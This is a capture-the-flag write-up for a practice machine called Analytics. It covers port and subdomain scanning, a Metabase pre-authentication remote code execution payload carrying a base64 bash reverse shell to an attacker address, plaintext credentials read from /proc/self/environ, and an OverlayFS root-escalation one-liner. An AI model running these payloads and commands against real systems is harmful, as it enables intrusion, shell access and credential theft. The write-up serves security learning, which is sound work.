												     ### Analytics Write-up ###
												--------------------------------------

													Reconnaissance & Scanning
					--------------------------------------------------------------------------------------------------------------------------------------------------------
 - We start up the machine and get an IP address of 10.10.11.233. We navigate over to the webpage and find that we are not allowed to access the webpage yet. We open up a terminal window and navigate over to our /etc/hosts file and add the IP and Domain name to the file using the command;

 
	"sudo nano /etc/hosts"

This would open the file and now we can add the IP to the end of our /etc/hosts file and well be able to refresh the page and see what the actual website is hosting. We see that it is an information and resource management page for analytics. We click on all the links within this page and notice its all really just hosted off the same page except for the login page thats redirecting to a new page with a "Dev" prefix. When we navigate over to the login page we realize that it wont load and put it next to our initial Analytics entry and refresh the page and get a login page for the Metabase cloud service.
 
After initally looking over the webpage and not finding much we set up the terminal we had to open TMUX and proceed to run an Nmap scan using the following;

	"nmap -sV -sC -Pn -oA Analytics.htb analytical.htb"

We get the following result and notice that there is only the webpage being hosted on port 80, and an SSH connection on port 22 with the version "OpenSSH 8.9p1" and "Ubuntu0.4"

_______________________________________________________________________________________________________
	# Nmap 7.94SVN scan initiated Fri Dec 29 16:24:22 2023 as: nmap -sC -sV -Pn -oA Analytics 10.10.11.233
	Nmap scan report for 10.10.11.233
	Host is up (0.084s latency).
	Not shown: 998 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
	|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
	80/tcp open  http    nginx 1.18.0 (Ubuntu)
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	|_http-title: Did not follow redirect to http://analytical.htb/
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Fri Dec 29 16:24:37 2023 -- 1 IP address (1 host up) scanned in 15.58 seconds
--------------------------------------------------------------------------------------------------------------------------------------------------------

We also use Gobuster to determine if there are any other hidden directories using the following command and only see the data.analytical.htb url.

	"gobuster dns -d analytical.htb -w /home/d0rian/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -i"
	
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Domain:     analytical.htb
	[+] Threads:    10
	[+] Show IPs:   true
	[+] Timeout:    1s
	[+] Wordlist:   /home/d0rian/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
	===============================================================
	Starting gobuster in DNS enumeration mode
	===============================================================
	Found: data.analytical.htb [::ffff:10.10.11.233]

	===============================================================
	Finished
	===============================================================
	

We look up the metabase server and any information in regards to vulnerabilities discovered and come across an article that shows us where we might be able to access any endpoints connected to the webpage and find a vulnerability that was recently discovered discusses a pre-authentication Remote Code Execution Vulnerability that abuses an endpoint under "/api/sessions/properties" which retains the token that we can use to bypass the Metabase login page.

We navigate over to the data.analytical.htb/api/session/properties and find a bunch of text within the browsers webpage that contain the token we are looking for.

	"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"


We can now use a falsified payload through burpsuites repeater and try to get the page to create a reverse shell computer to our system with the token provided and the RCE vulnerability(Links located at bottom of scanning section) we discovered for metabase too. 

 ____________
| Resources |
 ------------
- https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
- https://github.com/shamo0/CVE-2023-38646-PoC


														Gaining Access
						--------------------------------------------------------------------------------------------------------------------------------------------------------

- Create a Bash shell script

	"bash -i >& /dev/tcp/{Attacker IP}/{Listener port} 0>&1"


 - Base64 encode the reverse shell script 

	"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjE2LjE3LzU1NTUgMD4mMQ=="

 
 - Copy the H2 proof of concept from this article describing how potential threat actors could abuse the Metabase endpoint and input the reverse shell script in the following example

	
	POST /api/setup/validate HTTP/1.1
	Host: localhost
	Content-Type: application/json
	Content-Length: 566

	{
    	"token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    	"details":
    	{	
        	"is_on_demand": false,
        	"is_full_sync": false,
        	"is_sample": false,
        	"cache_ttl": null,
        	"refingerprint": false,
        	"auto_run_queries": true,
        	"schedules":
        	{},
        	"details":
        	{
		"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL(####REVERSE SHELL SCRIPT-Base 64 encoded####).openConnection().getContentLength()\n$$--=x\\;",
	            "advanced-options": false,
	            "ssl": true
	        },
	        "name": "an-sec-research-team",
	        "engine": "h2"
	    }
	}
	


 - Now combine all of the previous elements and we have a final falsified http payload


	POST /api/setup/validate HTTP/1.1
	Host: localhost
	Content-Type: application/json
	Content-Length: 566
	
	{
	    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
	    "details":
	    {
	        "is_on_demand": false,
	        "is_full_sync": false,
	        "is_sample": false,
	        "cache_ttl": null,
	        "refingerprint": false,
	        "auto_run_queries": true,
	        "schedules":
	        {},
	        "details":
	        {
	            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjE2LjE3LzU1NTUgMD4mMQ==}|{base64,-d}|{bash, -i}')\n$$--=x\\;",
	            "advanced-options": false,
	            "ssl": true
	        },
	        "name": "an-sec-research-team",
	        "engine": "h2"
	    }
	}



 - Now that we have the falsified payload finished we can launch up burpsuite and set up Netcat to listen on port 5555 to see if we can make that connection. We go to the login page and set up burpsuite to intercept traffic and send the faek login through to intercept. Once we see it show up on our burpsuite program we grab the packet and send it to the repeater feature. Once we are on the repeater tab of the program we replace the packet with the payload we created and send it through.

- We see that we get a connection on our hosts system in the terminal.
and are able to now input the commands we want. We proceed to input the command "whoami" to return the user we are currently operating under which returns a Metalytics username. We attempt to use the "sudo -l" and it shows us that we are not allowed to do that. We look around some more within the environment and finally find a file by the name of "environ" within the "/proc/self" directory. We use the "cat" command so that we can see the information stored within that file. We find that it outputs information that also has some SSH credentials we might be able to use.

#############################################################################################################
	SHELL=/bin/sh
	MB_DB_PASS=
	HOSTNAME=
	LANGUAGE=en_US:en  
	MB_JETTY_HOST=0.0.0.0
	JAVA_HOME=/opt/java/openjdk
	MB_DB_FILE=//metabase.db/metabase.db
	PWD=/home/metabase
	LOGNAME=metabase
	MB_EMAIL_SMTP_USERNAME=
	HOME=/home/metabase
	LANG=en_US.UTF-8
-->	META_USER=metalytics			<---
-->	META_PASS=An4lytics_ds20223#		<---
	MB_EMAIL_SMTP_PASSWORD=
	USER=metabase
	SHLVL=4
	MB_DB_USER=
	FC_LANG=en-US
	LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
	LC_CTYPE=en_US.UTF-8  
	MB_LDAP_BIND_DN=
	LC_ALL=en_US.UTF-8
	MB_LDAP_PASSWORD=
	PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	MB_DB_CONNECTION_URI=
	JAVA_VERSION=jdk-11.0.19+7
	_=/bin/cat
	OLDPWD=/home/metabase/.ssh
#############################################################################################################

														Maintaining Access
									-----------------------------------------------------------------------------------------------------------
 - Now that we have some credentials we try to log in and establish an SSh connection and find that we are succesful using the credentials we found in the "/proc/self/" directory in the environ file. Now that we are inside the SSH service with the Metalytics credentials we use the "ls -la" command to see what is in the current directory and find that we see the first flag. "user.txt". Now that we have the first flag we can focus on some the final area of this box and look for any way we can escalate to root. 

 - After some research we find that there is a current vulnerability(CVE-2023-2640, CVE-2023-32629) within the Ubuntu kernel OverlayFS module that allows us to root the non-root directories under certain circumstances using these vulnerabilites. After some more research we find a Github page with a script we can use to execute within the non-root directories(/Metalytics/home/) and attempt to escalate to the root user. 
 
 - We navigate over to the "~/home" dir since we have privileges within that directory and use the raw command within the exploit.sh file on the Github page for the vulnerability to execute and give us root. We use the following command within the SSH connection;
 

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'



 - After executing the command we see that the user changes to "root@analytics" and we use the command "whoami" and see the result "root". Remembering that we saw the root directory when traversing around in the network we navigate over to "/root". Once in there we find the last flag for the Challenge. Congrats.

____________
| Resources |
 ------------
 - https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/ (
 - https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 (NON-ROOT to ROOT dir exploit)
 
